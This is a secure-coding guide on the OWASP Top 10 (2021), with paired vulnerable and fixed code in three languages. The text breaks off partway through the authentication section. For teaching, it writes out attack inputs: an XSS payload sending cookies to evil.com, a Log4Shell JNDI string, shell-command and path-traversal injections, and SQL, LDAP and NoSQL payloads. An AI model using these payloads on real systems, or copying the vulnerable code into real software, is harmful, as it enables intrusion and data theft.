---
id: owasp-top10-complete
title: OWASP Top 10 (2021) Complete Security Standards
domain: security
category: 01-standards
difficulty: intermediate
tags: [access, broken, complete, contents, control, cryptographic, failures, injection]
quality_score: 70
last_updated: 2026-06-15
---
# OWASP Top 10 (2021) Complete Security Standards

> **Version**: v1.0
> **Last Updated**: 2026-03-28
> **Scope**: Web application security - all 10 categories with attack scenarios, code examples, defense strategies, and detection tools
> **Languages Covered**: Python, JavaScript, Java

---

## Table of Contents

1. [A01:2021 Broken Access Control](#a012021-broken-access-control)
2. [A02:2021 Cryptographic Failures](#a022021-cryptographic-failures)
3. [A03:2021 Injection](#a032021-injection)
4. [A04:2021 Insecure Design](#a042021-insecure-design)
5. [A05:2021 Security Misconfiguration](#a052021-security-misconfiguration)
6. [A06:2021 Vulnerable and Outdated Components](#a062021-vulnerable-and-outdated-components)
7. [A07:2021 Identification and Authentication Failures](#a072021-identification-and-authentication-failures)
8. [A08:2021 Software and Data Integrity Failures](#a082021-software-and-data-integrity-failures)
9. [A09:2021 Security Logging and Monitoring Failures](#a092021-security-logging-and-monitoring-failures)
10. [A10:2021 Server-Side Request Forgery (SSRF)](#a102021-server-side-request-forgery-ssrf)
11. [Agent Security Checklist](#agent-security-checklist)

---

## A01:2021 Broken Access Control

### Description

Broken Access Control moved up from #5 to the most critical web application security risk. It occurs when users can act outside their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of data, or performing business functions outside the user's limits.

Common access control vulnerabilities include:
- Bypassing access control checks by modifying the URL, internal application state, or HTML page
- Allowing the primary key to be changed to another user's record (IDOR)
- Elevation of privilege (acting as a user without being logged in, or acting as admin when logged in as a regular user)
- Metadata manipulation such as replaying or tampering with JWT tokens, cookies, or hidden fields
- CORS misconfiguration allowing access from unauthorized origins
- Force browsing to authenticated pages as an unauthenticated user

### Attack Scenarios

**Scenario 1: Insecure Direct Object Reference (IDOR)**
An attacker modifies a URL parameter to access another user's account data:
```
GET /api/users/1234/profile  ->  GET /api/users/5678/profile
```

**Scenario 2: Path Traversal**
An attacker manipulates file path parameters to access restricted resources:
```
GET /api/files?path=../../../etc/passwd
```

**Scenario 3: Missing Function-Level Access Control**
A regular user accesses admin endpoints directly:
```
POST /api/admin/users/delete
```

### Vulnerable Code Examples

**Python (Flask) - IDOR Vulnerability:**
```python
# VULNERABLE: No authorization check on resource ownership
@app.route('/api/orders/<int:order_id>')
def get_order(order_id):
    order = Order.query.get(order_id)
    if not order:
        return jsonify({"error": "Not found"}), 404
    return jsonify(order.to_dict())  # Any user can access any order
```

**JavaScript (Express) - Missing Role Check:**
```javascript
// VULNERABLE: No role verification for admin operations
app.delete('/api/users/:id', authenticate, async (req, res) => {
  await User.findByIdAndDelete(req.params.id);
  res.json({ message: 'User deleted' });
});
```

**Java (Spring) - Privilege Escalation:**
```java
// VULNERABLE: No authorization annotation, any authenticated user can access
@RestController
@RequestMapping("/api/admin")
public class AdminController {
    @PostMapping("/settings")
    public ResponseEntity<?> updateSettings(@RequestBody Settings settings) {
        settingsService.update(settings);
        return ResponseEntity.ok().build();
    }
}
```

### Fixed Code Examples

**Python (Flask) - Proper Ownership Check:**
```python
# FIXED: Verify resource ownership before returning data
@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    order = Order.query.get(order_id)
    if not order:
        return jsonify({"error": "Not found"}), 404
    if order.user_id != current_user.id and not current_user.is_admin:
        return jsonify({"error": "Forbidden"}), 403
    return jsonify(order.to_dict())
```

**JavaScript (Express) - Role-Based Access Control:**
```javascript
// FIXED: Middleware enforces admin role requirement
const requireAdmin = (req, res, next) => {
  if (!req.user || req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  next();
};

app.delete('/api/users/:id', authenticate, requireAdmin, async (req, res) => {
  await User.findByIdAndDelete(req.params.id);
  res.json({ message: 'User deleted' });
});
```

**Java (Spring) - Proper Authorization:**
```java
// FIXED: Role-based access control with Spring Security annotation
@RestController
@RequestMapping("/api/admin")
@PreAuthorize("hasRole('ADMIN')")
public class AdminController {
    @PostMapping("/settings")
    public ResponseEntity<?> updateSettings(@RequestBody Settings settings) {
        settingsService.update(settings);
        return ResponseEntity.ok().build();
    }
}
```

### Defense Strategies

1. **Deny by default** - except for public resources, deny access by default
2. **Implement access control mechanisms once and reuse** throughout the application, including minimizing CORS usage
3. **Model access controls should enforce record ownership** rather than accepting that the user can create, read, update, or delete any record
4. **Unique application business limit requirements should be enforced by domain models**
5. **Disable web server directory listing** and ensure file metadata (e.g., .git) and backup files are not present within web roots
6. **Log access control failures and alert admins** when appropriate (e.g., repeated failures)
7. **Rate-limit API and controller access** to minimize harm from automated attack tooling
8. **Stateless session tokens should be invalidated on the server** after logout; stateless JWT tokens should be short-lived

### Detection Tools

- **Burp Suite** - Automated access control testing with Authorize extension
- **OWASP ZAP** - Active scan rules for broken access control
- **Semgrep** - Static rules for missing auth decorators/annotations
- **SonarQube** - Detects missing authorization checks in code
- **Manual code review** - Review all endpoints for proper authorization logic

---

## A02:2021 Cryptographic Failures

### Description

Previously known as "Sensitive Data Exposure," this category focuses on failures related to cryptography that often lead to exposure of sensitive data. Common issues include:

- Transmitting data in clear text (HTTP, SMTP, FTP)
- Using old or weak cryptographic algorithms or protocols
- Using default crypto keys, generating weak crypto keys, or lacking proper key management/rotation
- Not enforcing encryption via security headers or directives
- Insufficient certificate validation and trust chain verification
- Using deprecated hash functions like MD5 or SHA1 for password storage
- Using non-cryptographic random functions for cryptographic purposes

### Attack Scenarios

**Scenario 1: Weak Password Hashing**
An attacker gains access to the database and finds passwords hashed with MD5. Using rainbow tables, they recover plaintext passwords within minutes.

**Scenario 2: Missing Transport Encryption**
An application transmits credit card numbers over HTTP. An attacker on the same network captures the traffic via packet sniffing.

**Scenario 3: Hardcoded Encryption Keys**
Secret keys are committed to source control; an attacker reads the repository history and decrypts all stored data.

### Vulnerable Code Examples

**Python - Weak Hashing:**
```python
import hashlib

# VULNERABLE: MD5 is cryptographically broken for password hashing
def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()

def verify_password(password, hashed):
    return hashlib.md5(password.encode()).hexdigest() == hashed
```

**JavaScript - Hardcoded Secrets:**
```javascript
// VULNERABLE: Encryption key hardcoded in source code
const crypto = require('crypto');
const SECRET_KEY = 'my-super-secret-key-12345';

function encrypt(text) {
  const cipher = crypto.createCipher('aes-128-ecb', SECRET_KEY); // ECB mode is weak
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return encrypted;
}
```

**Java - Weak Random Number Generation:**
```java
// VULNERABLE: java.util.Random is not cryptographically secure
import java.util.Random;

public class TokenGenerator {
    public String generateToken() {
        Random random = new Random();
        StringBuilder token = new StringBuilder();
        for (int i = 0; i < 32; i++) {
            token.append(Integer.toHexString(random.nextInt(16)));
        }
        return token.toString();
    }
}
```

### Fixed Code Examples

**Python - Secure Hashing with bcrypt:**
```python
import bcrypt

# FIXED: bcrypt with automatic salting and configurable work factor
def hash_password(password: str) -> str:
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode('utf-8'), salt).decode('utf-8')

def verify_password(password: str, hashed: str) -> bool:
    return bcrypt.checkpw(password.encode('utf-8'), hashed.encode('utf-8'))
```

**JavaScript - Proper Encryption with Key Management:**
```javascript
// FIXED: AES-256-GCM with environment-sourced key and random IV
const crypto = require('crypto');

const SECRET_KEY = Buffer.from(process.env.ENCRYPTION_KEY, 'hex'); // 32 bytes from env

function encrypt(text) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-gcm', SECRET_KEY, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  const authTag = cipher.getAuthTag().toString('hex');
  return `${iv.toString('hex')}:${authTag}:${encrypted}`;
}

function decrypt(encryptedText) {
  const [ivHex, authTagHex, encrypted] = encryptedText.split(':');
  const iv = Buffer.from(ivHex, 'hex');
  const authTag = Buffer.from(authTagHex, 'hex');
  const decipher = crypto.createDecipheriv('aes-256-gcm', SECRET_KEY, iv);
  decipher.setAuthTag(authTag);
  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}
```

**Java - Cryptographically Secure Random:**
```java
// FIXED: SecureRandom for cryptographic token generation
import java.security.SecureRandom;
import java.util.Base64;

public class TokenGenerator {
    private static final SecureRandom secureRandom = new SecureRandom();

    public String generateToken() {
        byte[] tokenBytes = new byte[32];
        secureRandom.nextBytes(tokenBytes);
        return Base64.getUrlEncoder().withoutPadding().encodeToString(tokenBytes);
    }
}
```

### Defense Strategies

1. **Classify data** processed, stored, or transmitted by the application. Identify which data is sensitive according to privacy laws, regulatory requirements, or business needs
2. **Don't store sensitive data unnecessarily.** Discard it as soon as possible or use PCI DSS-compliant tokenization
3. **Encrypt all sensitive data at rest** using strong algorithms (AES-256)
4. **Enforce encryption in transit** with TLS 1.2+. Use HTTP Strict Transport Security (HSTS)
5. **Use strong adaptive salted hashing functions** for passwords: bcrypt, scrypt, Argon2id
6. **Use authenticated encryption** (GCM mode) instead of plain encryption (ECB/CBC without HMAC)
7. **Generate keys using cryptographically secure pseudo-random number generators** (CSPRNG)
8. **Manage keys through a secrets manager** (AWS KMS, HashiCorp Vault, Azure Key Vault); implement key rotation

### Detection Tools

- **TruffleHog** - Scans git repositories for hardcoded secrets and keys
- **GitLeaks** - Detects secrets in git repos
- **SSLyze / testssl.sh** - Tests TLS configuration quality
- **Semgrep** - Rules for weak crypto algorithms and hardcoded secrets
- **SonarQube** - Identifies weak crypto usage in code
- **Mozilla Observatory** - Tests for HSTS and transport security headers

---

## A03:2021 Injection

### Description

Injection flaws occur when an application sends untrusted data to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization. This category covers:

- **SQL Injection** - Manipulating SQL queries through user input
- **Cross-Site Scripting (XSS)** - Injecting malicious scripts into web pages
- **Command Injection** - Executing arbitrary OS commands
- **LDAP Injection** - Manipulating LDAP queries
- **NoSQL Injection** - Exploiting NoSQL query languages
- **Expression Language / Template Injection** - Server-side template injection (SSTI)

### Attack Scenarios

**Scenario 1: SQL Injection**
An attacker submits `' OR '1'='1' --` as the username, bypassing authentication and gaining access to the first account in the database.

**Scenario 2: Stored XSS**
An attacker posts a comment containing `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`. Every user viewing the comment has their session cookie stolen.

**Scenario 3: Command Injection**
An application passes user input to a system command: `ping <user_input>`. The attacker submits `127.0.0.1; cat /etc/passwd` to read sensitive system files.

**Scenario 4: LDAP Injection**
An attacker submits `*)(uid=*))(|(uid=*` as a username in an LDAP authentication query, potentially bypassing authentication.

### Vulnerable Code Examples

**Python - SQL Injection:**
```python
# VULNERABLE: String concatenation in SQL query
@app.route('/api/users')
def search_users():
    name = request.args.get('name')
    query = f"SELECT * FROM users WHERE name = '{name}'"
    result = db.engine.execute(query)
    return jsonify([dict(row) for row in result])
```

**JavaScript - XSS (Reflected):**
```javascript
// VULNERABLE: User input directly rendered in HTML
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Search Results for: ${query}</h1>`);
  // Attacker: /search?q=<script>alert(document.cookie)</script>
});
```

**JavaScript - XSS (DOM-based):**
```javascript
// VULNERABLE: Unsafe DOM manipulation with user-controlled data
const params = new URLSearchParams(window.location.search);
const username = params.get('user');
document.getElementById('greeting').innerHTML = `Welcome, ${username}!`;
```

**Python - Command Injection:**
```python
import os

# VULNERABLE: User input passed directly to shell command
@app.route('/api/ping')
def ping_host():
    host = request.args.get('host')
    result = os.popen(f'ping -c 3 {host}').read()
    return jsonify({"result": result})
```

**Java - SQL Injection:**
```java
// VULNERABLE: Concatenated SQL query
public User findUser(String username, String password) {
    String query = "SELECT * FROM users WHERE username = '" + username
                 + "' AND password = '" + password + "'";
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(query);
    // ...
}
```

**Python - NoSQL Injection (MongoDB):**
```python
# VULNERABLE: Unsanitized input in MongoDB query
@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    user = db.users.find_one({
        "username": data['username'],
        "password": data['password']  # Attacker sends {"$gt": ""} as password
    })
    if user:
        return jsonify({"status": "logged in"})
```

### Fixed Code Examples

**Python - Parameterized SQL Query:**
```python
# FIXED: Parameterized query prevents SQL injection
@app.route('/api/users')
def search_users():
    name = request.args.get('name')
    result = db.engine.execute(
        text("SELECT * FROM users WHERE name = :name"),
        {"name": name}
    )
    return jsonify([dict(row) for row in result])
```

**Python - Using ORM (SQLAlchemy):**
```python
# FIXED: ORM automatically parameterizes queries
@app.route('/api/users')
def search_users():
    name = request.args.get('name')
    users = User.query.filter_by(name=name).all()
    return jsonify([u.to_dict() for u in users])
```

**JavaScript - XSS Prevention:**
```javascript
// FIXED: HTML encoding of user input
const escapeHtml = require('escape-html');

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`<h1>Search Results for: ${query}</h1>`);
});

// For React/Vue: frameworks escape by default, but avoid dangerouslySetInnerHTML
// React (safe by default):
function SearchResults({ query }) {
  return <h1>Search Results for: {query}</h1>; // Auto-escaped
}
```

**JavaScript - DOM XSS Prevention:**
```javascript
// FIXED: Use textContent instead of innerHTML
const params = new URLSearchParams(window.location.search);
const username = params.get('user');
document.getElementById('greeting').textContent = `Welcome, ${username}!`;
```

**Python - Safe Command Execution:**
```python
import subprocess
import shlex
import ipaddress

# FIXED: Input validation + no shell=True + argument list
@app.route('/api/ping')
def ping_host():
    host = request.args.get('host')
    try:
        ipaddress.ip_address(host)  # Validate it's a real IP address
    except ValueError:
        return jsonify({"error": "Invalid IP address"}), 400

    result = subprocess.run(
        ['ping', '-c', '3', host],
        capture_output=True, text=True, timeout=10
    )
    return jsonify({"result": result.stdout})
```

**Java - Prepared Statement:**
```java
// FIXED: PreparedStatement with parameter binding
public User findUser(String username, String password) {
    String query = "SELECT * FROM users WHERE username = ? AND password = ?";
    PreparedStatement stmt = connection.prepareStatement(query);
    stmt.setString(1, username);
    stmt.setString(2, password);
    ResultSet rs = stmt.executeQuery();
    // ...
}
```

**Python - NoSQL Injection Prevention:**
```python
# FIXED: Type validation and explicit string casting
@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    username = str(data.get('username', ''))
    password = str(data.get('password', ''))

    if not username or not password:
        return jsonify({"error": "Missing credentials"}), 400

    user = db.users.find_one({
        "username": username,
        "password_hash": bcrypt.hashpw(password.encode(), stored_salt)
    })
    if user:
        return jsonify({"status": "logged in"})
```

### Defense Strategies

1. **Use parameterized queries / prepared statements** for all database access
2. **Use ORM frameworks** (SQLAlchemy, Prisma, Hibernate) that handle parameterization automatically
3. **Validate and sanitize all input** - use allowlists over denylists
4. **Context-sensitive output encoding** for XSS prevention (HTML, JavaScript, URL, CSS contexts)
5. **Use Content Security Policy (CSP)** headers to mitigate XSS impact
6. **Avoid shell=True** in subprocess calls; pass arguments as lists
7. **Apply the principle of least privilege** to database accounts used by the application
8. **Use LIMIT and other SQL controls** to prevent mass disclosure in case of SQL injection

### Detection Tools

- **SQLMap** - Automated SQL injection detection and exploitation
- **OWASP ZAP** - Active and passive XSS/injection scanning
- **Bandit** - Python static analysis for command injection, SQL injection
- **ESLint security plugins** (eslint-plugin-security) - Detects unsafe patterns in JavaScript
- **Semgrep** - Language-aware rules for all injection types
- **SpotBugs + FindSecBugs** - Java static analysis for injection vulnerabilities
- **DOMPurify** (runtime) - Client-side HTML sanitization library

---

## A04:2021 Insecure Design

### Description

Insecure Design is a new category in the 2021 edition, focusing on risks related to design and architectural flaws. It calls for more use of threat modeling, secure design patterns, and reference architectures. Unlike implementation bugs, insecure design cannot be fixed by a perfect implementation -- the security controls were never created to defend against specific attacks.

Key areas include:
- Missing or ineffective rate limiting on sensitive operations
- Lack of tenant isolation in multi-tenant systems
- Missing business logic validation
- Insufficient abuse case testing
- No defense-in-depth strategy

### Attack Scenarios

**Scenario 1: Missing Rate Limiting on Password Reset**
An attacker brute-forces the 4-digit password reset code (10,000 combinations). The application has no rate limiting on the reset endpoint.

**Scenario 2: Business Logic Bypass**
An e-commerce site offers a $50 referral bonus. An attacker creates multiple fake accounts to exploit the referral system because no fraud detection was designed.

**Scenario 3: Missing Tenant Isolation**
A multi-tenant SaaS application stores all tenant data in the same table without proper row-level security. A bug in the query layer exposes one tenant's data to another.

### Vulnerable Code Examples

**Python - No Rate Limiting on Sensitive Endpoint:**
```python
# VULNERABLE: No rate limiting on password reset
@app.route('/api/password-reset/verify', methods=['POST'])
def verify_reset_code():
    email = request.json['email']
    code = request.json['code']
    stored = ResetCode.query.filter_by(email=email, code=code).first()
    if stored:
        return jsonify({"token": generate_reset_token(email)})
    return jsonify({"error": "Invalid code"}), 400
```

**JavaScript - No Business Logic Validation:**
```javascript
// VULNERABLE: No validation that price matches the actual product price
app.post('/api/checkout', authenticate, async (req, res) => {
  const { productId, quantity, price } = req.body;
  const order = await Order.create({
    userId: req.user.id,
    productId,
    quantity,
    totalPrice: price * quantity  // Attacker controls price
  });
  res.json(order);
});
```

**Java - No Abuse Case Handling:**
```java
// VULNERABLE: No limit on coupon usage, no fraud detection
@PostMapping("/api/apply-coupon")
public ResponseEntity<?> applyCoupon(@RequestBody CouponRequest request) {
    Coupon coupon = couponRepository.findByCode(request.getCode());
    if (coupon != null && coupon.isValid()) {
        return ResponseEntity.ok(new DiscountResponse(coupon.getDiscount()));
    }
    return ResponseEntity.badRequest().build();
}
```

### Fixed Code Examples

**Python - Rate-Limited Reset with Expiry:**
```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

# FIXED: Rate limiting + code expiry + attempt tracking
@app.route('/api/password-reset/verify', methods=['POST'])
@limiter.limit("5 per minute")
def verify_reset_code():
    email = request.json['email']
    code = request.json['code']

    stored = ResetCode.query.filter_by(email=email).first()
    if not stored:
        return jsonify({"error": "Invalid code"}), 400

    if stored.attempts >= 5:
        db.session.delete(stored)
        db.session.commit()
        return jsonify({"error": "Too many attempts. Request a new code."}), 429

    if stored.expires_at < datetime.utcnow():
        db.session.delete(stored)
        db.session.commit()
        return jsonify({"error": "Code expired"}), 400

    if stored.code != code:
        stored.attempts += 1
        db.session.commit()
        return jsonify({"error": "Invalid code"}), 400

    db.session.delete(stored)
    db.session.commit()
    return jsonify({"token": generate_reset_token(email)})
```

**JavaScript - Server-Side Price Validation:**
```javascript
// FIXED: Server-side price validation from database
app.post('/api/checkout', authenticate, async (req, res) => {
  const { productId, quantity } = req.body;

  const product = await Product.findById(productId);
  if (!product || !product.inStock || quantity > product.maxPerOrder) {
    return res.status(400).json({ error: 'Invalid product or quantity' });
  }

  const totalPrice = product.price * quantity;
  const order = await Order.create({
    userId: req.user.id,
    productId,
    quantity,
    totalPrice  // Price always from server-side source of truth
  });
  res.json(order);
});
```

**Java - Coupon with Abuse Controls:**
```java
// FIXED: Usage limits, user tracking, and fraud detection
@PostMapping("/api/apply-coupon")
public ResponseEntity<?> applyCoupon(@RequestBody CouponRequest request,
                                      @AuthenticationPrincipal UserDetails user) {
    Coupon coupon = couponRepository.findByCode(request.getCode());
    if (coupon == null || !coupon.isValid()) {
        return ResponseEntity.badRequest().body("Invalid coupon");
    }

    long userUsageCount = couponUsageRepository.countByUserIdAndCouponId(
        user.getId(), coupon.getId());
    if (userUsageCount >= coupon.getMaxUsagePerUser()) {
        return ResponseEntity.badRequest().body("Coupon already used");
    }

    if (coupon.getTotalUsageCount() >= coupon.getMaxTotalUsage()) {
        return ResponseEntity.badRequest().body("Coupon expired");
    }

    couponUsageRepository.save(new CouponUsage(user.getId(), coupon.getId()));
    coupon.incrementUsageCount();
    couponRepository.save(coupon);

    return ResponseEntity.ok(new DiscountResponse(coupon.getDiscount()));
}
```

### Defense Strategies

1. **Establish and use a secure development lifecycle** with AppSec professionals to evaluate and design security and privacy-related controls
2. **Use threat modeling** for critical authentication, access control, business logic, and key flows
3. **Integrate security language and controls into user stories** (e.g., "As a user, I cannot reset another user's password")
4. **Write unit and integration tests to validate** that all critical flows are resistant to the threat model
5. **Segregate tier layers** on the system and network layers depending on exposure and protection needs
6. **Limit resource consumption** by user or service (rate limiting, throttling, quotas)
7. **Design for tenant isolation** in multi-tenant architectures from day one

### Detection Tools

- **Threat Dragon (OWASP)** - Threat modeling tool
- **Microsoft Threat Modeling Tool** - Automated threat modeling
- **Architectural review** - Manual review of security design patterns
- **Business logic test cases** - Abuse case testing in integration tests
- **OWASP ASVS** - Application Security Verification Standard for design review

---

## A05:2021 Security Misconfiguration

### Description

Security Misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, unnecessary HTTP methods, permissive CORS, and verbose error messages containing sensitive information.

Common misconfiguration issues:
- Unnecessary features enabled or installed (ports, services, pages, accounts, privileges)
- Default accounts and passwords still enabled and unchanged
- Error handling reveals stack traces or overly informative error messages to users
- Latest security features disabled or not configured securely
- Missing security hardening headers
- Software is out of date or vulnerable

### Attack Scenarios

**Scenario 1: Debug Mode in Production**
A Django application is deployed with `DEBUG = True`. An attacker triggers an error and receives detailed stack traces, environment variables, and database credentials.

**Scenario 2: Default Credentials**
An admin panel at `/admin` uses the default username `admin` and password `admin`. An attacker gains full administrative access.

**Scenario 3: Overly Permissive CORS**
An API sets `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`, allowing any website to make authenticated requests on behalf of users.

### Vulnerable Code Examples

**Python (Django) - Debug and Error Disclosure:**
```python
# VULNERABLE: settings.py for production
DEBUG = True  # Exposes detailed error pages
ALLOWED_HOSTS = ['*']  # Accepts any host header
SECRET_KEY = 'django-insecure-!@#$%^&*()'  # Default/weak secret key

# Missing security middleware
MIDDLEWARE = [
    'django.middleware.common.CommonMiddleware',
    # Missing: SecurityMiddleware, CsrfViewMiddleware, XFrameOptionsMiddleware
]
```

**JavaScript (Express) - Verbose Errors and Missing Headers:**
```javascript
// VULNERABLE: Detailed error messages in production
const app = express();

app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack,       // Exposes internal code structure
    query: req.query,       // Exposes request details
    env: process.env        // Exposes environment variables!
  });
});

// Missing security headers entirely
// No helmet, no CORS configuration
```

**Java (Spring) - Exposing Actuator Endpoints:**
```java
// VULNERABLE: application.properties
// Exposes all actuator endpoints without authentication
management.endpoints.web.exposure.include=*
management.endpoint.env.show-values=ALWAYS
spring.datasource.url=jdbc:postgresql://prod-db:5432/app
spring.datasource.username=root
spring.datasource.password=SuperSecret123
```

### Fixed Code Examples

**Python (Django) - Hardened Production Settings:**
```python
# FIXED: Production-hardened settings
import os

DEBUG = False
ALLOWED_HOSTS = ['app.example.com']
SECRET_KEY = os.environ['DJANGO_SECRET_KEY']

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
]

# Security headers
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = 'DENY'
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_SSL_REDIRECT = True
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
```

**JavaScript (Express) - Proper Error Handling and Headers:**
```javascript
// FIXED: Secure error handling with helmet for headers
const helmet = require('helmet');
const cors = require('cors');

const app = express();
app.use(helmet());

app.use(cors({
  origin: ['https://app.example.com'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
}));

// Generic error handler for production
app.use((err, req, res, next) => {
  console.error('Internal error:', err);  // Log full error server-side
  res.status(500).json({
    error: 'An internal error occurred',
    requestId: req.id  // Return only a correlation ID
  });
});
```

**Java (Spring) - Locked Down Actuator:**
```java
// FIXED: application-prod.properties
management.endpoints.web.exposure.include=health,info
management.endpoint.health.show-details=never
management.endpoint.env.enabled=false

spring.datasource.url=${DB_URL}
spring.datasource.username=${DB_USER}
spring.datasource.password=${DB_PASSWORD}

server.error.include-stacktrace=never
server.error.include-message=never
```

### Defense Strategies

1. **Implement a repeatable hardening process** for deploying environments (dev, QA, production) with identical but different credentials
2. **Minimize the platform** - remove unused features, components, documentation, and samples
3. **Review and update configurations** as part of the patch management process, especially security notes and headers
4. **Implement a segmented application architecture** that provides effective separation between components or tenants
5. **Send security directives** to clients via headers (CSP, HSTS, X-Content-Type-Options, etc.)
6. **Automate verification** of the effectiveness of configurations and settings in all environments
7. **Use Infrastructure as Code** (Terraform, CloudFormation) to enforce consistent security configurations

### Detection Tools

- **ScoutSuite** - Multi-cloud security auditing tool
- **Prowler** - AWS security assessment
- **kube-bench** - CIS Kubernetes Benchmark checks
- **Mozilla Observatory** - HTTP security header checking
- **Lynis** - Linux security auditing
- **Hadolint** - Dockerfile linting for security best practices
- **Trivy** - Configuration scanning for containers and IaC

---

## A06:2021 Vulnerable and Outdated Components

### Description

Components (libraries, frameworks, and other software modules) run with the same privileges as the application. If a vulnerable component is exploited, it can cause serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks.

You are likely vulnerable if:
- You do not know the versions of all components used (both client-side and server-side), including nested dependencies
- Software is vulnerable, unsupported, or out of date (OS, web server, DBMS, applications, APIs, runtime environments, libraries)
- You do not scan for vulnerabilities regularly and subscribe to security bulletins related to components you use
- You do not fix or upgrade the underlying platform, frameworks, and dependencies in a timely fashion
- Developers do not test the compatibility of updated, upgraded, or patched libraries

### Attack Scenarios

**Scenario 1: Log4Shell (CVE-2021-44228)**
An application uses Apache Log4j 2.x. An attacker sends a crafted log message `${jndi:ldap://evil.com/exploit}` which triggers remote code execution.

**Scenario 2: Prototype Pollution**
An application uses a vulnerable version of lodash. An attacker manipulates `__proto__` to inject properties into all JavaScript objects, leading to denial of service or remote code execution.

**Scenario 3: Outdated Framework with Known SQLi**
An application uses an old version of a PHP framework with a known SQL injection vulnerability that was patched two years ago.

### Vulnerable Code Examples

**Python - Unpinned Dependencies:**
```
# VULNERABLE: requirements.txt with no version pinning
flask
sqlalchemy
requests
pyjwt
cryptography
```

**JavaScript - Outdated package.json:**
```json
{
  "dependencies": {
    "express": "^3.0.0",
    "lodash": "4.17.15",
    "jsonwebtoken": "^7.0.0",
    "serialize-javascript": "1.9.1"
  }
}
```

**Java - Vulnerable Log4j in pom.xml:**
```xml
<!-- VULNERABLE: Log4j version with RCE vulnerability -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
</dependency>
```

### Fixed Code Examples

**Python - Pinned Dependencies with Hash Verification:**
```
# FIXED: requirements.txt with exact versions
flask==3.0.2
sqlalchemy==2.0.27
requests==2.31.0
pyjwt==2.8.0
cryptography==42.0.4
```

```toml
# BETTER: pyproject.toml with version constraints
[project]
dependencies = [
    "flask>=3.0,<4.0",
    "sqlalchemy>=2.0,<3.0",
    "requests>=2.31,<3.0",
]
```

**JavaScript - Updated and Audited Dependencies:**
```json
{
  "dependencies": {
    "express": "^4.18.2",
    "lodash": "^4.17.21",
    "jsonwebtoken": "^9.0.2",
    "serialize-javascript": "^6.0.2"
  },
  "scripts": {
    "audit": "npm audit --production",
    "audit:fix": "npm audit fix"
  }
}
```

**Java - Patched Dependencies with BOM:**
```xml
<!-- FIXED: Use BOM for consistent, patched versions -->
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-bom</artifactId>
            <version>2.23.0</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>
```

### Defense Strategies

1. **Remove unused dependencies**, unnecessary features, components, files, and documentation
2. **Continuously inventory versions** of both client-side and server-side components using tools like OWASP Dependency-Check, npm audit, pip-audit
3. **Monitor sources like CVE and NVD** for vulnerabilities in components. Use Software Composition Analysis (SCA) tools to automate this
4. **Only obtain components from official sources** over secure links. Prefer signed packages
5. **Monitor for libraries and components that are unmaintained** or do not create security patches for older versions
6. **Use a lockfile** (package-lock.json, poetry.lock, Pipfile.lock) to ensure reproducible builds
7. **Automate dependency updates** using Dependabot, Renovate, or similar tools with CI integration

### Detection Tools

- **OWASP Dependency-Check** - Detects publicly disclosed vulnerabilities in project dependencies
- **npm audit / yarn audit** - Built-in Node.js dependency vulnerability scanning
- **pip-audit** - Python dependency vulnerability scanning
- **Snyk** - SCA for all major languages
- **Trivy** - Container and filesystem vulnerability scanning
- **Dependabot / Renovate** - Automated dependency update PRs
- **OWASP Dependency-Track** - Continuous component analysis platform
- **Safety** - Python dependency checker against known vulnerabilities database

---

## A07:2021 Identification and Authentication Failures

### Description

Confirmation of the user's identity, authentication, and session management is critical to protect against authentication-related attacks. There may be authentication weaknesses if the application:

- Permits automated attacks such as credential stuffing (testing lists of known passwords)
- Permits brute force or other automated attacks
- Permits default, weak, or well-known passwords
- Uses weak or ineffective credential recovery and forgot-password processes
- Uses plain text, encrypted, or weakly hashed passwords
- Has missing or ineffective multi-factor authentication
- Exposes session identifiers in the URL
- Reuses session identifiers after successful login
- Does not correctly invalidate session IDs during logout or inactivity

### Attack Scenarios

**Scenario 1: Credential Stuffing**
An attacker uses a list of leaked username/password pairs from another breach to try to log into the application. Without rate limiting or account lockout, they gain access to accounts where users reused passwords.

**Scenario 2: Session Fixation**
An attacker crafts a URL with a known session ID and tricks a victim into authenticating with it. The attacker can then use the same session ID to access the victim's authenticated session.

